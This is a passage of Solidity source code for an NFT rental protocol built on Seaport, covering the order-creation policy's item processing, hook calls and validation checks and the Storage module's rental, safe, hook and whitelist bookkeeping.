        /////////////////////////////////////////////////////////////////////////////////
        //                            Internal Functions                               //
        /////////////////////////////////////////////////////////////////////////////////

        /**
        * @dev Helper function to emit an event which signals a rental order has started.
        *
        * @param order     Rental order to emit.
        * @param orderHash Order hash of the seaport order.
        * @param extraData Any extra data to be emitted which was supplied by the offerer.
        */
        function _emitRentalOrderStarted(
            RentalOrder memory order,
            bytes32 orderHash,
            bytes memory extraData
        ) internal {
            // Emit the event.
            emit Events.RentalOrderStarted(
                orderHash,
                extraData,
                order.seaportOrderHash,
                order.items,
                order.hooks,
                order.orderType,
                order.lender,
                order.renter,
                order.rentalWallet,
                order.startTimestamp,
                order.endTimestamp
            );
        }

        /**
        * @dev Processes the offer items for inclusion in a BASE order. All offer items must
        *      adhere to the BASE order format, else execution will revert.
        *
        * @param rentalItems Running array of items that comprise the rental order.
        * @param offers      Array of offer items to include in the the order.
        * @param startIndex  Index to begin adding the offer items to the
        *                    `rentalItems` array.
        */
        function _processBaseOrderOffer(
            Item[] memory rentalItems,
            SpentItem[] memory offers,
            uint256 startIndex
        ) internal pure {
            // Must be at least one offer item.
            if (offers.length == 0) {
                revert Errors.CreatePolicy_OfferCountZero();
            }

            // Define elements of the item which depend on the token type.
            ItemType itemType;

            // Process each offer item.
            for (uint256 i; i < offers.length; ++i) {
                // Get the offer item.
                SpentItem memory offer = offers[i];

                // Handle the ERC721 item.
                if (offer.isERC721()) {
                    itemType = ItemType.ERC721;
                }
                // Handle the ERC1155 item.
                else if (offer.isERC1155()) {
                    itemType = ItemType.ERC1155;
                }
                // ERC20s are not supported as offer items in a BASE order.
                else {
                    revert Errors.CreatePolicy_SeaportItemTypeNotSupported(offer.itemType);
                }

                // An ERC721 or ERC1155 offer item is considered a rented asset which will be
                // returned to the lender upon expiration of the rental order.
                rentalItems[i + startIndex] = Item({
                    itemType: itemType,
                    settleTo: SettleTo.LENDER,
                    token: offer.token,
                    amount: offer.amount,
                    identifier: offer.identifier
                });
            }
        }

        /**
        * @dev Processes the offer items for inclusion in a PAY order. All offer items must
        *      adhere to the PAY order format, else execution will revert.
        *
        * @param rentalItems Running array of items that comprise the rental order.
        * @param offers      Array of offer items to include in the the order.
        * @param startIndex  Index to begin adding the offer items to the
        *                    `rentalItems` array.
        */
        function _processPayOrderOffer(
            Item[] memory rentalItems,
            SpentItem[] memory offers,
            uint256 startIndex
        ) internal pure {
            // Keep track of each item type.
            uint256 totalRentals;
            uint256 totalPayments;

            // Define elements of the item which depend on the token type.
            ItemType itemType;
            SettleTo settleTo;

            // Process each offer item.
            for (uint256 i; i < offers.length; ++i) {
                // Get the offer item.
                SpentItem memory offer = offers[i];

                // Handle the ERC721 item.
                if (offer.isERC721()) {
                    // The ERC721 will be returned to the lender upon expiration
                    // of the rental order.
                    itemType = ItemType.ERC721;
                    settleTo = SettleTo.LENDER;

                    // Increment rentals.
                    totalRentals++;
                }
                // Handle the ERC1155 item.
                else if (offer.isERC1155()) {
                    // The ERC1155 will be returned to the lender upon expiration
                    // of the rental order.
                    itemType = ItemType.ERC1155;
                    settleTo = SettleTo.LENDER;

                    // Increment rentals.
                    totalRentals++;
                }
                // Process an ERC20 offer item.
                else if (offer.isERC20()) {
                    // An ERC20 offer item is considered a payment to the renter upon
                    // expiration of the rental order.
                    itemType = ItemType.ERC20;
                    settleTo = SettleTo.RENTER;

                    // Increment payments.
                    totalPayments++;
                }
                // Revert if unsupported item type.
                else {
                    revert Errors.CreatePolicy_SeaportItemTypeNotSupported(offer.itemType);
                }

                // Create the item.
                rentalItems[i + startIndex] = Item({
                    itemType: itemType,
                    settleTo: settleTo,
                    token: offer.token,
                    amount: offer.amount,
                    identifier: offer.identifier
                });
            }

            // PAY order offer must have at least one rental and one payment.
            if (totalRentals == 0 || totalPayments == 0) {
                revert Errors.CreatePolicy_ItemCountZero(totalRentals, totalPayments);
            }
        }

        /**
        * @dev Processes the consideration items for inclusion in a BASE order. All
        *      consideration items must adhere to the BASE order format, else
        *      execution will revert.
        *
        * @param rentalItems    Running array of items that comprise the rental order.
        * @param considerations Array of consideration items to include in the the order.
        * @param startIndex     Index to begin adding the offer items to the
        *                       `rentalItems` array.
        */
        function _processBaseOrderConsideration(
            Item[] memory rentalItems,
            ReceivedItem[] memory considerations,
            uint256 startIndex
        ) internal pure {
            // Must be at least one consideration item.
            if (considerations.length == 0) {
                revert Errors.CreatePolicy_ConsiderationCountZero();
            }

            // Process each consideration item.
            for (uint256 i; i < considerations.length; ++i) {
                // Get the consideration item.
                ReceivedItem memory consideration = considerations[i];

                // Only process an ERC20 item.
                if (!consideration.isERC20()) {
                    revert Errors.CreatePolicy_SeaportItemTypeNotSupported(
                        consideration.itemType
                    );
                }

                // An ERC20 consideration item is considered a payment to the lender upon
                // expiration of the rental order.
                rentalItems[i + startIndex] = Item({
                    itemType: ItemType.ERC20,
                    settleTo: SettleTo.LENDER,
                    token: consideration.token,
                    amount: consideration.amount,
                    identifier: consideration.identifier
                });
            }
        }

        /**
        * @dev Processes the consideration items for inclusion in a PAYEE order. All
        *      consideration items must adhere to the PAYEE order format, else
        *      execution will revert.
        *
        * @param considerations Array of consideration items to include in the the order.
        */
        function _processPayeeOrderConsideration(
            Item[] memory rentalItems,
            ReceivedItem[] memory considerations,
            uint256 startIndex
        ) internal pure {
            // Keep track of each item type.
            uint256 totalRentals;
            uint256 totalPayments;

            // Define elements of the item which depend on the token type.
            ItemType itemType;
            SettleTo settleTo;

            // Process each consideration item.
            for (uint256 i; i < considerations.length; ++i) {
                // Get the consideration item.
                ReceivedItem memory consideration = considerations[i];

                // Process an ERC721 item.
                if (consideration.isERC721()) {
                    // The ERC1155 will be returned to the lender upon expiration
                    // of the rental order.
                    itemType = ItemType.ERC721;
                    settleTo = SettleTo.LENDER;

                    // Increment rentals.
                    totalRentals++;
                }
                // Process an ERC1155 item
                else if (consideration.isERC1155()) {
                    // The ERC1155 will be returned to the lender upon expiration
                    // of the rental order.
                    itemType = ItemType.ERC1155;
                    settleTo = SettleTo.LENDER;

                    // Increment rentals.
                    totalRentals++;
                }
                // Process an ERC20 item.
                else if (consideration.isERC20()) {
                    // An ERC20 offer item is considered a payment to the renter upon
                    // expiration of the rental order.
                    itemType = ItemType.ERC20;
                    settleTo = SettleTo.RENTER;

                    // Increment payments.
                    totalPayments++;
                }
                // Revert if unsupported item type.
                else {
                    revert Errors.CreatePolicy_SeaportItemTypeNotSupported(
                        consideration.itemType
                    );
                }

                // Create the item.
                rentalItems[i + startIndex] = Item({
                    itemType: itemType,
                    settleTo: settleTo,
                    token: consideration.token,
                    amount: consideration.amount,
                    identifier: consideration.identifier
                });
            }

            // PAYEE order consideration must have at least one rental and one payment.
            if (totalRentals == 0 || totalPayments == 0) {
                revert Errors.CreatePolicy_ItemCountZero(totalRentals, totalPayments);
            }
        }

        /**
        * @dev Converts an offer array and a consideration array into a single array of
        *      `Item` which comprise a rental order. The offers and considerations must
        *      adhere to a specific set of rules depending on the type of order being
        *      constructed.
        *
        * @param offers         Array of Seaport offer items.
        * @param considerations Array of seaport consideration items.
        * @param orderType      Order type of the rental.
        */
        function _convertToItems(
            SpentItem[] memory offers,
            ReceivedItem[] memory considerations,
            OrderType orderType
        ) internal pure returns (Item[] memory items) {
            // Initialize an array of items.
            items = new Item[](offers.length + considerations.length);

            // Process items for a base order.
            if (orderType.isBaseOrder()) {
                // Process offer items.
                _processBaseOrderOffer(items, offers, 0);

                // Process consideration items.
                _processBaseOrderConsideration(items, considerations, offers.length);
            }
            // Process items for a pay order.
            else if (orderType.isPayOrder()) {
                // Process offer items.
                _processPayOrderOffer(items, offers, 0);

                // Assert that no consideration items are provided.
                if (considerations.length > 0) {
                    revert Errors.CreatePolicy_ConsiderationCountNonZero(
                        considerations.length
                    );
                }
            }
            // Process items for a payee order.
            else if (orderType.isPayeeOrder()) {
                // Assert that no offer items are provided.
                if (offers.length > 0) {
                    revert Errors.CreatePolicy_OfferCountNonZero(offers.length);
                }

                // Process consideration items.
                _processPayeeOrderConsideration(items, considerations, 0);
            }
            // Revert if order type is not supported.
            else {
                revert Errors.Shared_OrderTypeNotSupported(uint8(orderType));
            }
        }

        /**
        * @dev When a rental order is created, process each hook one by one but only if
        *      the hook's status is set to execute on a rental start.
        *
        * @param hooks        Array of hooks to process for the order.
        * @param offerItems   Array of offer items which are referenced by the hooks
        * @param rentalWallet Address of the rental wallet which is the recipient
        *                     of the rented assets.
        */
        function _addHooks(
            Hook[] memory hooks,
            SpentItem[] memory offerItems,
            address rentalWallet
        ) internal {
            // Define hook target, offer item index, and an offer item.
            address target;
            uint256 itemIndex;
            SpentItem memory offer;

            // Loop through each hook in the payload.
            for (uint256 i = 0; i < hooks.length; ++i) {
                // Get the hook's target address.
                target = hooks[i].target;

                // Check that the hook is reNFT-approved to execute on rental start.
                if (STORE.hookOnStart(target)) {
                    // Get the offer item index for this hook.
                    itemIndex = hooks[i].itemIndex;

                    // Get the offer item for this hook.
                    offer = offerItems[itemIndex];

                    // Make sure the offer item is an ERC721 or ERC1155.
                    if (!offer.isRental()) {
                        revert Errors.Shared_NonRentalHookItem(itemIndex);
                    }

                    // Call the hook with data about the rented item.
                    try
                        IHook(target).onStart(
                            rentalWallet,
                            offer.token,
                            offer.identifier,
                            offer.amount,
                            hooks[i].extraData
                        )
                    {} catch Error(string memory revertReason) {
                        // Revert with reason given.
                        revert Errors.Shared_HookFailString(revertReason);
                    } catch Panic(uint256 errorCode) {
                        // Convert solidity panic code to string.
                        string memory stringErrorCode = LibString.toString(errorCode);

                        // Revert with panic code.
                        revert Errors.Shared_HookFailString(
                            string.concat("Hook reverted: Panic code ", stringErrorCode)
                        );
                    } catch (bytes memory revertData) {
                        // Fallback to an error that returns the byte data.
                        revert Errors.Shared_HookFailBytes(revertData);
                    }
                }
            }
        }

        /**
        * @dev Initiates a rental order using a rental payload received by the fulfiller,
        *      and a payload from seaport with data involving the assets that were
        *      transferred in the order.
        *
        * @param payload Payload from the order fulfiller.
        * @param seaportPayload Payload containing the result of a seaport order fulfillment.
        */
        function _rentFromZone(
            RentPayload memory payload,
            SeaportPayload memory seaportPayload
        ) internal {
            // Check: Only full restricted orders are supported.
            _isValidSeaportOrderType(seaportPayload.orderType);

            // Check: The payload is being used for the correct order.
            _isValidPayloadForOrder(payload.orderHash, seaportPayload.orderHash);

            // Check: make sure order metadata is valid with the given seaport order zone hash.
            _isValidOrderMetadata(payload.metadata, seaportPayload.zoneHash);

            // Check: verify the fulfiller of the order is an owner of the recipient safe.
            _isValidSafeOwner(seaportPayload.fulfiller, payload.fulfillment.recipient);

            // Check: verify each execution was sent to the expected destination.
            _executionInvariantChecks(seaportPayload.totalExecutions);

            // Check: validate and process seaport offer and consideration items based
            // on the order type.
            Item[] memory items = _convertToItems(
                seaportPayload.offer,
                seaportPayload.consideration,
                payload.metadata.orderType
            );

            // Check: Once all items have been processed, confirm that all items adhere to the
            // protocol whitelist for rented assets and payments.
            _checkProtocolWhitelist(items);

            // PAYEE orders are considered mirror-images of a PAY order. So, PAYEE orders
            // do not need to be processed in the same way that other order types do.
            if (
                payload.metadata.orderType.isBaseOrder() ||
                payload.metadata.orderType.isPayOrder()
            ) {
                // Create an accumulator which will hold all of the rental asset updates, consisting of IDs and
                // the rented amount. From this point on, new memory cannot be safely allocated until the
                // accumulator no longer needs to include elements.
                bytes memory rentalAssetUpdates = new bytes(0);

                // Check if each item is a rental. If so, then generate the rental asset update.
                // Memory will become safe again after this block.
                for (uint256 i; i < items.length; ++i) {
                    if (items[i].isRental()) {
                        // Insert the rental asset update into the dynamic array.
                        _insert(
                            rentalAssetUpdates,
                            items[i].toRentalId(payload.fulfillment.recipient),
                            items[i].amount
                        );
                    }
                }

                // Generate the rental order.
                RentalOrder memory order = RentalOrder({
                    seaportOrderHash: seaportPayload.orderHash,
                    items: items,
                    hooks: payload.metadata.hooks,
                    orderType: payload.metadata.orderType,
                    lender: seaportPayload.offerer,
                    renter: payload.intendedFulfiller,
                    rentalWallet: payload.fulfillment.recipient,
                    startTimestamp: block.timestamp,
                    endTimestamp: block.timestamp + payload.metadata.rentDuration
                });

                // Compute the order hash.
                bytes32 orderHash = _deriveRentalOrderHash(order);

                // Interaction: Update storage only if the order is a Base Order or Pay order.
                STORE.addRentals(orderHash, _convertToStatic(rentalAssetUpdates), items);

                // Interaction: Send tokens to their expected destinations. The rented assets
                // will go to the rental wallet and the payments will go to the escrow.
                for (uint256 i = 0; i < items.length; ++i) {
                    Item memory item = items[i];

                    if (item.isERC20()) {
                        // Send tokens to the payment escrow.
                        item.token.transferERC20(address(ESCRW), item.amount);

                        // increase deposit on the escrow
                        ESCRW.increaseDeposit(item.token, item.amount);
                    } else if (item.isERC721()) {
                        // Send ERC721 to the rental wallet.
                        item.transferERC721(order.rentalWallet);
                    } else if (item.isERC1155()) {
                        // Send ERC1155 to the rental wallet.
                        item.transferERC1155(order.rentalWallet);
                    }
                }

                // Interaction: Process the hooks associated with this rental.
                if (payload.metadata.hooks.length > 0) {
                    _addHooks(
                        payload.metadata.hooks,
                        seaportPayload.offer,
                        payload.fulfillment.recipient
                    );
                }

                // Emit rental order started.
                _emitRentalOrderStarted(order, orderHash, payload.metadata.emittedExtraData);
            }
        }

        /**
        * @dev Checks that the seaport order type is supported.
        *
        * @param orderType Order type for the order to fulfill.
        */
        function _isValidSeaportOrderType(SeaportOrderType orderType) internal pure {
            if (orderType != SeaportOrderType.FULL_RESTRICTED) {
                revert Errors.CreatePolicy_SeaportOrderTypeNotSupported(orderType);
            }
        }

        /**
        * @dev Checks that a payload is being used for the correct seaport order.
        *
        * @param payloadOrderHash Order hash that the payload expects.
        * @param seaportOrderHash Order hash of the order being fulfilled.
        */
        function _isValidPayloadForOrder(
            bytes32 payloadOrderHash,
            bytes32 seaportOrderHash
        ) internal pure {
            if (payloadOrderHash != seaportOrderHash) {
                revert Errors.CreatePolicy_InvalidPayloadForOrderHash(
                    payloadOrderHash,
                    seaportOrderHash
                );
            }
        }

        /**
        * @dev Checks that the order metadata passed with the seaport order is expected.
        *
        * @param metadata Order metadata that was passed in with the fulfillment.
        * @param zoneHash Hash of the order metadata that was passed in when the Seaport
        *                 order was signed.
        */
        function _isValidOrderMetadata(
            OrderMetadata memory metadata,
            bytes32 zoneHash
        ) internal view {
            // Check that the rent duration specified is not too long.
            if (STORE.maxRentDuration() < metadata.rentDuration) {
                revert Errors.CreatePolicy_RentDurationTooLong(metadata.rentDuration);
            }

            // Check that the rent duration specified is not zero.
            if (metadata.rentDuration == 0) {
                revert Errors.CreatePolicy_RentDurationZero();
            }

            // Check that the zone hash is equal to the derived hash of the metadata.
            if (_deriveOrderMetadataHash(metadata) != zoneHash) {
                revert Errors.CreatePolicy_InvalidOrderMetadataHash();
            }
        }

        /**
        * @dev Checks that an address is the owner of a protocol-deployed rental safe.
        *
        * @param owner Address of the potential safe owner.
        * @param safe  Address of the potential protocol-deployed rental safe.
        */
        function _isValidSafeOwner(address owner, address safe) internal view {
            // Make sure only protocol-deployed safes can rent.
            if (STORE.deployedSafes(safe) == 0) {
                revert Errors.CreatePolicy_InvalidRentalSafe(safe);
            }

            // Make sure the fulfiller is the owner of the recipient rental safe.
            if (!ISafe(safe).isOwner(owner)) {
                revert Errors.CreatePolicy_InvalidSafeOwner(owner, safe);
            }
        }

        /**
        * @dev After a Seaport order has been executed, invariant checks are made to ensure
        *      that all assets were sent to the correct address. More specifically, all
        *      tokens must first be sent to the Create Policy.
        *
        * @param executions Each execution that was performed by Seaport.
        */
        function _executionInvariantChecks(ReceivedItem[] memory executions) internal view {
            for (uint256 i = 0; i < executions.length; ++i) {
                ReceivedItem memory execution = executions[i];

                // All tokens must first be sent to the Create Policy.
                if (execution.recipient != address(this)) {
                    revert Errors.CreatePolicy_UnexpectedTokenRecipient(
                        execution.itemType,
                        execution.token,
                        execution.identifier,
                        execution.amount,
                        execution.recipient,
                        address(this)
                    );
                }
            }
        }

        /**
        * @dev Determines if an array of items are supported by the protocol whitelist.
        *
        * @param items The items generated by the incoming rental order.
        */
        function _checkProtocolWhitelist(Item[] memory items) internal view {
            for (uint256 i = 0; i < items.length; ++i) {
                // Get the token address for the item
                address token = items[i].token;

                // Check that a rented asset exists in the whitelisted assets mapping.
                if (items[i].isRental() && !STORE.whitelistedAssets(token)) {
                    revert Errors.CreatePolicy_AssetNotWhitelisted(token);
                }

                // Check that a payment exists in the whitelisted payments mapping.
                if (items[i].isERC20() && !STORE.whitelistedPayments(token)) {
                    revert Errors.CreatePolicy_PaymentNotWhitelisted(token);
                }
            }
        }

        /////////////////////////////////////////////////////////////////////////////////
        //                            External Functions                               //
        /////////////////////////////////////////////////////////////////////////////////

        /**
        * @notice Callback function implemented to make this contract a valid Seaport zone.
        *         It can be considered the entrypoint to creating a rental. When a seaport
        *         order specifies the create policy as its zone address, Seaport will call
        *         this function after each order in the batch is processed. A call to
        *         `validateOrder` is what kicks off the rental process, and performs steps
        *         to convert a seaport order into a rental order which is stored
        *         by the protocol.
        *
        * @param zoneParams Parameters from the seaport order.
        *
        * @return validOrderMagicValue A `bytes4` value to return back to Seaport.
        */
        function validateOrder(
            ZoneParameters calldata zoneParams
        ) external override onlyRole("SEAPORT") returns (bytes4 validOrderMagicValue) {
            // Decode the signed rental zone payload from the extra data.
            (RentPayload memory payload, bytes memory signature) = abi.decode(
                zoneParams.extraData,
                (RentPayload, bytes)
            );

            // Create a payload of seaport data.
            SeaportPayload memory seaportPayload = SeaportPayload({
                orderHash: zoneParams.orderHash,
                zoneHash: zoneParams.zoneHash,
                offer: zoneParams.offer,
                consideration: zoneParams.consideration,
                totalExecutions: zoneParams.totalExecutions,
                fulfiller: zoneParams.fulfiller,
                offerer: zoneParams.offerer,
                orderType: zoneParams.orderType
            });

            // Generate the rent payload hash.
            bytes32 rentPayloadHash = _deriveRentPayloadHash(payload);

            // Recover the signer from the payload.
            address signer = _recoverSignerFromPayload(rentPayloadHash, signature);

            // Check: The signature from the protocol signer has not expired.
            _validateProtocolSignatureExpiration(payload.expiration);

            // Check: The fulfiller is the intended fulfiller.
            _validateFulfiller(payload.intendedFulfiller, seaportPayload.fulfiller);

            // Check: The data matches the signature and that the protocol signer is the one that signed.
            if (!kernel.hasRole(signer, toRole("CREATE_SIGNER"))) {
                revert Errors.CreatePolicy_UnauthorizedCreatePolicySigner(signer);
            }

            // Initiate the rental using the rental manager.
            _rentFromZone(payload, seaportPayload);

            // Return the selector of validateOrder as the magic value.
            validOrderMagicValue = ZoneInterface.validateOrder.selector;
        }

        /**
        * @notice Returns whether the interface is supported.
        *
        * @param interfaceId The interface ID to check against.
        */
        function supportsInterface(
            bytes4 interfaceId
        ) public view override(Zone, TokenReceiver) returns (bool) {
            return
                Zone.supportsInterface(interfaceId) ||
                TokenReceiver.supportsInterface(interfaceId);
        }
    }



</details>






<details>
<summary><b>Storage.sol</b></summary>
<br>


    // SPDX-License-Identifier: BUSL-1.1
    pragma solidity ^0.8.20;

    import {Kernel, Module, Keycode} from "@src/Kernel.sol";
    import {Proxiable} from "@src/proxy/Proxiable.sol";
    import {RentalUtils} from "@src/libraries/RentalUtils.sol";
    import {RentalId, RentalAssetUpdate, Item, SpentItem, ReceivedItem, OrderType} from "@src/libraries/RentalStructs.sol";
    import {Errors} from "@src/libraries/Errors.sol";

    /**
    * @title StorageBase
    * @notice Storage exists in its own base contract to avoid storage slot mismatch during upgrades.
    */
    contract StorageBase {
        /////////////////////////////////////////////////////////////////////////////////
        //                                Rental Storage                               //
        /////////////////////////////////////////////////////////////////////////////////

        // Points an order hash to whether it is active.
        mapping(bytes32 orderHash => bool isActive) public orders;

        // Points an item ID to its number of actively rented tokens. This is used to
        // determine if an item is actively rented within the protocol. For ERC721, this
        // value will always be 1 when actively rented. Any inactive rentals will have a
        // value of 0.
        mapping(RentalId itemId => uint256 amount) public rentedAssets;

        mapping(address erc721Token => uint256 count) public rentedERC721s;

        // Maximum rent duration.
        uint256 public maxRentDuration;

        /////////////////////////////////////////////////////////////////////////////////
        //                            Deployed Safe Storage                            //
        /////////////////////////////////////////////////////////////////////////////////

        // Records all safes that have been deployed by the protocol.
        mapping(address safe => uint256 nonce) public deployedSafes;

        // Records the total amount of deployed safes.
        uint256 public totalSafes;

        /////////////////////////////////////////////////////////////////////////////////
        //                                 Hook Storage                                //
        /////////////////////////////////////////////////////////////////////////////////

        // When interacting with the guard, any contracts that have hooks enabled
        // should have the guard logic routed through them.
        mapping(address to => address hook) internal _contractToHook;

        // Mapping of a bitmap which denotes the hook functions that are enabled.
        mapping(address hook => uint8 enabled) public hookStatus;

        /////////////////////////////////////////////////////////////////////////////////
        //                            Whitelist Storage                                //
        /////////////////////////////////////////////////////////////////////////////////

        // Allows the safe to delegate call to an approved address. For example, delegate
        // call to a contract that would swap out an old gnosis safe module for a new one.
        mapping(address delegate => bool isWhitelisted) public whitelistedDelegates;

        // Allows for the safe registration of extensions that can be enabled on a safe.
        mapping(address extension => uint8 enabled) public whitelistedExtensions;

        // Allows the use of these whitelisted tokens as rentable assets.
        mapping(address asset => bool isWhitelisted) public whitelistedAssets;

        // Allows the use of these whitelisted tokens as payments for rentals.
        mapping(address payment => bool isWhitelisted) public whitelistedPayments;
    }

    /**
    * @title Storage
    * @notice Module dedicated to maintaining all the storage for the protocol. Includes
    *         storage for active rentals, deployed rental safes, hooks, and whitelists.
    */
    contract Storage is Proxiable, Module, StorageBase {
        using RentalUtils for address;
        using RentalUtils for Item;
        using RentalUtils for Item[];
        using RentalUtils for SpentItem;
        using RentalUtils for ReceivedItem;
        using RentalUtils for OrderType;

        /////////////////////////////////////////////////////////////////////////////////
        //                         Kernel Module Configuration                         //
        /////////////////////////////////////////////////////////////////////////////////

        /**
        * @dev Instantiate this contract as a module. When using a proxy, the kernel address
        *      should be set to address(0).
        *
        * @param kernel_ Address of the kernel contract.
        */
        constructor(Kernel kernel_) Module(kernel_) {}

        /**
        * @notice Instantiates this contract as a module via a proxy.
        *
        * @param kernel_ Address of the kernel contract.
        */
        function MODULE_PROXY_INSTANTIATION(
            Kernel kernel_
        ) external onlyByProxy onlyUninitialized {
            kernel = kernel_;
            initialized = true;
        }

        /**
        * @notice Specifies which version of a module is being implemented.
        */
        function VERSION() external pure override returns (uint8 major, uint8 minor) {
            return (1, 0);
        }

        /**
        * @notice Defines the keycode for this module.
        */
        function KEYCODE() public pure override returns (Keycode) {
            return Keycode.wrap("STORE");
        }

        /////////////////////////////////////////////////////////////////////////////////
        //                              View Functions                                 //
        /////////////////////////////////////////////////////////////////////////////////

        /**
        * @notice Determines if an asset is actively being rented by a wallet.
        *
        * @param recipient  Address of the wallet which rents the asset.
        * @param token      Address of the token.
        * @param identifier ID of the token.
        *
        * @return Amount of actively rented tokens for the asset.
        */
        function isRentedOut(
            address recipient,
            address token,
            uint256 identifier
        ) external view returns (uint256) {
            // calculate the rental ID
            RentalId rentalId = RentalUtils.getItemPointer(recipient, token, identifier);

            // Determine if there is a positive amount
            return rentedAssets[rentalId];
        }

        /**
        * @notice Fetches the hook address that is pointing at the the target.
        *
        * @param to Address which has a hook pointing to it.
        */
        function contractToHook(address to) external view returns (address) {
            // Fetch the hook that the address currently points to.
            address hook = _contractToHook[to];

            // This hook may have been disabled without setting a new hook to take its place.
            // So if the hook is disabled, then return the 0 address.
            return hookStatus[hook] != 0 ? hook : address(0);
        }

        /**
        * @notice Determines whether the `onTransaction()` function is enabled for the hook.
        *
        * @param hook Address of the hook contract.
        */
        function hookOnTransaction(address hook) external view returns (bool) {
            // 1 is 0x00000001. Determines if the masked bit is enabled.
            return (uint8(1) & hookStatus[hook]) != 0;
        }

        /**
        * @notice Determines whether the `onStart()` function is enabled for the hook.
        *
        * @param hook Address of the hook contract.
        */
        function hookOnStart(address hook) external view returns (bool) {
            // 2 is 0x00000010. Determines if the masked bit is enabled.
            return uint8(2) & hookStatus[hook] != 0;
        }

        /**
        * @notice Determines whether the `onStop()` function is enabled for the hook.
        *
        * @param hook Address of the hook contract.
        */
        function hookOnStop(address hook) external view returns (bool) {
            // 4 is 0x00000100. Determines if the masked bit is enabled.
            return uint8(4) & hookStatus[hook] != 0;
        }

        /**
        * @notice Determines whether the extension can be enabled on the rental safe.
        *
        * @param extension Address of the extension contract.
        */
        function extensionEnableAllowed(address extension) external view returns (bool) {
            // 2 is 0x10. Determines if the masked bit is enabled.
            return uint8(2) & whitelistedExtensions[extension] != 0;
        }

        /**
        * @notice Determines whether the extension can be disabled on the rental safe.
        *
        * @param extension Address of the extension contract.
        */
        function extensionDisableAllowed(address extension) external view returns (bool) {
            // 1 is 0x01. Determines if the masked bit is enabled.
            return uint8(1) & whitelistedExtensions[extension] != 0;
        }

        /////////////////////////////////////////////////////////////////////////////////
        //                            External Functions                               //
        /////////////////////////////////////////////////////////////////////////////////

        /**
        * @notice Adds an order hash to storage. Once an order hash is added to storage,
        *         the assets contained within are considered actively rented. Additionally,
        *         rental asset IDs are added to storage which creates a blocklist on those
        *         assets. When the blocklist is active, the protocol guard becomes active on
        *         them and prevents transfer or approval of the assets by the owner of the
        *         safe.
        *
        * @param orderHash          Hash of the rental order which is added to storage.
        * @param rentalAssetUpdates Asset update structs which are added to storage.
        */
        function addRentals(
            bytes32 orderHash,
            RentalAssetUpdate[] memory rentalAssetUpdates,
            Item[] memory items
        ) external onlyByProxy permissioned {
            // Add the order to storage.
            orders[orderHash] = true;

            for (uint256 i = 0; i < items.length; ++i) {
                Item memory item = items[i];

                if (item.isERC721()) {
                    rentedERC721s[item.token] += 1;
                }
            }

            // Add the rented items to storage.
            for (uint256 i = 0; i < rentalAssetUpdates.length; ++i) {
                RentalAssetUpdate memory asset = rentalAssetUpdates[i];

                // Update the order hash for that item.
                rentedAssets[asset.rentalId] += asset.amount;
            }
        }

        /**
        * @notice Removes an order hash from storage. Once an order hash is removed from
        *         storage, it can no longer be stopped since the protocol will have no
        *         record of the order. Addtionally, rental asset IDs are removed from
        *         storage. Once these hashes are removed, they are no longer blocklisted
        *         from being transferred out of the rental wallet by the owner.
        *
        * @param orderHash          Hash of the rental order which will be removed from
        *                           storage.
        * @param rentalAssetUpdates Asset update structs which will be removed from storage.
        */
        function removeRentals(
            bytes32 orderHash,
            RentalAssetUpdate[] calldata rentalAssetUpdates,
            Item[] memory items
        ) external onlyByProxy permissioned {
            // Delete the order from storage.
            delete orders[orderHash];

            for (uint256 i = 0; i < items.length; ++i) {
                Item memory item = items[i];

                if (item.isERC721()) {
                    rentedERC721s[item.token] -= 1;
                }
            }

            // Process each rental asset.
            for (uint256 i = 0; i < rentalAssetUpdates.length; ++i) {
                RentalAssetUpdate memory asset = rentalAssetUpdates[i];

                // Reduce the amount of tokens for the particular rental ID.
                rentedAssets[asset.rentalId] -= asset.amount;
            }
        }

        /**
        * @notice Behaves the same as `removeRentals()`, except that orders are processed in
        *          a loop.
        *
        * @param orderHashes        All order hashes which will be removed from storage.
        * @param rentalAssetUpdates Asset update structs which will be removed from storage.
        */
        function removeRentalsBatch(
            bytes32[] calldata orderHashes,
            RentalAssetUpdate[] calldata rentalAssetUpdates
        ) external onlyByProxy permissioned {
            // Delete the orders from storage.
            for (uint256 i = 0; i < orderHashes.length; ++i) {
                // Delete the order from storage.
                delete orders[orderHashes[i]];
            }

            // Process each rental asset.
            for (uint256 i = 0; i < rentalAssetUpdates.length; ++i) {
                RentalAssetUpdate memory asset = rentalAssetUpdates[i];

                // Reduce the amount of tokens for the particular rental ID.
                rentedAssets[asset.rentalId] -= asset.amount;
            }
        }

        /**
        * @notice Adds the addresss of a rental safe to storage so that protocol-deployed
        *         rental safes can be distinguished from those deployed elsewhere.
        *
        * @param safe Address of the rental safe to add to storage.
        */
        function addRentalSafe(address safe) external onlyByProxy permissioned {
            // Get the new safe count.
            uint256 newSafeCount = totalSafes + 1;

            // Register the safe as deployed.
            deployedSafes[safe] = newSafeCount;

            // Increment nonce.
            totalSafes = newSafeCount;
        }

        /**
        * @notice Connects a hook to a destination address. Once an active path is made,
        *         any transactions originating from a rental safe to the target address
        *         will use a hook as middleware. The hook chosen is determined by the path
        *         set.
        *
        * @param to   Target address which will use a hook as middleware.
        * @param hook Address of the hook which will act as a middleware.
        */
        function updateHookPath(address to, address hook) external onlyByProxy permissioned {
            // Require that the `to` address is a contract.
            if (to.code.length == 0) revert Errors.StorageModule_NotContract(to);

            // Require that the `hook` address is a contract.
            if (hook.code.length == 0) revert Errors.StorageModule_NotContract(hook);

            // Point the `to` address to the `hook` address.
            _contractToHook[to] = hook;
        }

        /**
        * @notice Updates a hook with a bitmap that indicates its active functionality.
        *         A valid bitmap is any decimal value that is less than or equal
        *         to 7 (0x111).
        *
        * @param hook   Address of the hook contract.
        * @param bitmap Decimal value that defines the active functionality on the hook.
        */
        function updateHookStatus(
            address hook,
            uint8 bitmap
        ) external onlyByProxy permissioned {
            // Require that the `hook` address is a contract.
            if (hook.code.length == 0) revert Errors.StorageModule_NotContract(hook);

            // 7 is 0x00000111. This ensures that only a valid bitmap can be set.
            if (bitmap > uint8(7))
                revert Errors.StorageModule_InvalidHookStatusBitmap(bitmap);

            // Update the status of the hook.
            hookStatus[hook] = bitmap;
        }

        /**
        * @notice Toggles whether an address can be delegate called.
        *
        * @param delegate  Address which can be delegate called.
        * @param isEnabled Boolean indicating whether the address is enabled.
        */
        function toggleWhitelistDelegate(
            address delegate,
            bool isEnabled
        ) external onlyByProxy permissioned {
            whitelistedDelegates[delegate] = isEnabled;
        }

        /**
        * @notice Updates an extension with a bitmap that indicates whether the extension
        *         can be enabled or disabled by the rental safe. A valid bitmap is any
        *         decimal value that is less than or equal to 3 (0x11).
        *
        * @param extension Gnosis safe module which can be added to a rental safe.
